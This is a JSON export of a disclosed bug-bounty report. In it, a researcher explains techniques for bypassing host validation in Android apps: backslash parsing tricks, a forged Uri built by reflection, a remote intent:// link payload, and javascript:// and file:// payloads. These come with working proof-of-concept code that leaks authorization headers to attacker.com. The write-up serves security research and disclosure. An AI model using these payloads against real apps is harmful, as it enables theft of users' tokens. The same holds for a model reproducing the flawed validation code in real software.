{
  "id": 431002,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MzEwMDI=",
  "url": "https://hackerone.com/reports/431002",
  "title": "Golden techniques to bypass host validations in Android apps",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2018-10-30T17:38:29.617Z",
  "submitted_at": "2018-10-30T17:38:29.617Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bagipro",
    "url": "/bagipro",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 31807,
    "url": "https://hackerone.com/redact",
    "handle": "redact",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "profile": {
      "name": "██████",
      "twitter_handle": "",
      "website": "",
      "about": "██████ "
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": true,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-10-30T19:35:37.364Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "███",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 274,
  "voters": [
    "mole_concept",
    "overjt",
    "8ayac",
    "ikuamike",
    "irek",
    "cxzer0",
    "sebch",
    "mathec",
    "n1m0",
    "mrmax4o4",
    "and 264 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 11359,
      "category": "researcher",
      "content": "# #1 Backslash tricks\nLook at a typical host validation\n```java\nUri uri = Uri.parse(attackerControlledString);\nif(\"legitimate.com\".equals(uri.getHost() || uri.getHost().endsWith(\".legitimate.com\")) {\n    webView.loadUrl(attackerControlledString, getAuthorizationHeaders()); // or webView.loadUrl(uri.toString())\n}\n```\n\nThere is a problem in ``` android.net.Uri ``` and ``` java.net.URL ``` parsers. They don't recognize backslashes in authority part (``` java.net.URI ``` will show an exception for that). If you test \n```java\nString url = \"http://attacker.com\\\\\\\\@legitimate.com/smth\";\nLog.d(\"Wow\", Uri.parse(url).getHost()); // legitimate.com is printed!\nwebView.loadUrl(url, getAuthorizationHeaders()); // attacker.com is loaded :P\n```\n\n# #2 Reflection\nHere is an example of a super-secure URL validation:\n```java\nUri uri = getIntent().getData();\nboolean isOurDomain = \"https\".equals(uri.getScheme()) && uri.getUserInfo() == null && \"legitimate.com\".equals(uri.getHost());\nif(isOurDomain) {\n    webView.load(uri.toString(), getAuthorizationHeaders());\n}\n```\n\n``` android.net.Uri ``` is widely used on the Android platform, but if you look at the source code, you will notice that there is an abstract class with a few internal subclasses! I found that custom URI with arbitrary parts could be built using ``` android.net.Uri$HierarchicalUri ```. Got the point already?\nCode in ``` MainActivity.java ```:\n```java\npublic class MainActivity extends Activity {\n\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        Uri uri;\n        try {\n            Class partClass = Class.forName(\"android.net.Uri$Part\");\n            Constructor partConstructor = partClass.getDeclaredConstructors()[0];\n            partConstructor.setAccessible(true);\n\n            Class pathPartClass = Class.forName(\"android.net.Uri$PathPart\");\n            Constructor pathPartConstructor = pathPartClass.getDeclaredConstructors()[0];\n            pathPartConstructor.setAccessible(true);\n\n            Class hierarchicalUriClass = Class.forName(\"android.net.Uri$HierarchicalUri\");\n            Constructor hierarchicalUriConstructor = hierarchicalUriClass.getDeclaredConstructors()[0];\n            hierarchicalUriConstructor.setAccessible(true);\n\n            Object authority = partConstructor.newInstance(\"legitimate.com\", \"legitimate.com\");\n            Object path = pathPartConstructor.newInstance(\"@attacker.com\", \"@attacker.com\");\n            uri = (Uri) hierarchicalUriConstructor.newInstance(\"https\", authority, path, null, null);\n        }\n        catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n\n        Intent intent = new Intent();\n        intent.setData(uri);\n        intent.setClass(this, TestActivity.class);\n        startActivity(intent);\n    }\n}\n```\n\nCode in ``` TestActivity.java ```:\n```java\npublic class TestActivity extends Activity {\n\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        Uri uri = getIntent().getData();\n        Log.d(\"Wow\", \"Scheme: \" + uri.getScheme());\n        Log.d(\"Wow\", \"UserInfo: \" + uri.getUserInfo());\n        Log.d(\"Wow\", \"Host: \" + uri.getHost());\n        Log.d(\"Wow\", \"toString(): \" + uri.toString());\n    }\n}\n```\n\nIn my case it displays:\n```\n10-30 06:02:20.142 32044 32044 D Wow     : Scheme: https\n10-30 06:02:20.142 32044 32044 D Wow     : UserInfo: null\n10-30 06:02:20.142 32044 32044 D Wow     : Host: legitimate.com\n10-30 06:02:20.142 32044 32044 D Wow     : toString(): https://legitimate.com@attacker.com\n```\n\nIt happens because apps parse URI only once, and a victim app doesn't parse it again, but trusts to \"already parsed\" URI received from untrusted sources\n\n# #3 Remote technique for #1\nAs you know, apps can automatically handle external links from browsers/messengers. This can be done by registering a special ``` intent-filter ```\n```xml\n\t<activity android:name=\".DeeplinkActivity\">\n\t    <intent-filter android:autoVerify=\"true\">\n\t        <action android:name=\"android.intent.action.VIEW\"/>\n\t        <category android:name=\"android.intent.category.DEFAULT\"/>\n\t        <category android:name=\"android.intent.category.BROWSABLE\"/>\n\t        <data android:scheme=\"https\" android:host=\"legitimate.com\"/>\n\t    </intent-filter>\n\t</activity>\n```\nAt this step you've already verified that you can attack that from third-party apps/ADB. If you try to create a remote PoC both to match the filter (remember that Android also uses ``` parsedIntent.getData().getHost() ``` to match with values defined in intent-filters) and triggers the bug\n```html\n<a href=\"https://attacker.com\\\\@legitimate.com/\">Begin zaheck!</a>\n```\nor\n\n```html\n<a href=\"https://attacker.com%5C%5C@legitimate.com/\">Begin zaheck!</a>\n```\nyou will notice that in the first example all ``` \\ ``` will be replaced with ``` / ```, in the second they will be kept encoded and the backslash trick won't work. But after careful research how ``` intent:// ``` scheme uries work I found a way to exploit it remotely. Intro: https://blog.oversecured.com/Android-Access-to-app-protected-components/#access-to-arbitrary-components-via-webview\n\nAll backslashes could be saved in unchanged state in e.g. hash part of a URI right here https://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6334\n\nPoC:\n```html\n<a href=\"intent://not_used/#Intent;scheme=https://attacker.com\\\\@legitimate.com/;end\">Begin zaheck!</a>\n```\nHere https://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6436 it will be equal to\n```java\nUri.parse(\"https://attacker.com\\\\\\\\@legitimate.com/://not_used/\")\n```\nAnd the attack becomes remote!\n\n# #4 Missing scheme validation\nIn case if only the host value is validated, but the scheme isn't validated, you can use the following payloads with ``` javascript:// ``` and ``` file:// ``` scheme\n```\njavascript://legitimate.com/%0aalert(1)//\n```\nor\n```\nfile://legitimate.com/sdcard/payload.html\n```\n",
      "user": {
        "id": 52239,
        "username": "bagipro",
        "name": "Sergey Toshin",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": "https://oversecured.com/",
        "location": "",
        "created_at": "2016-01-21T22:43:16.784Z",
        "url": "https://hackerone.com/bagipro",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
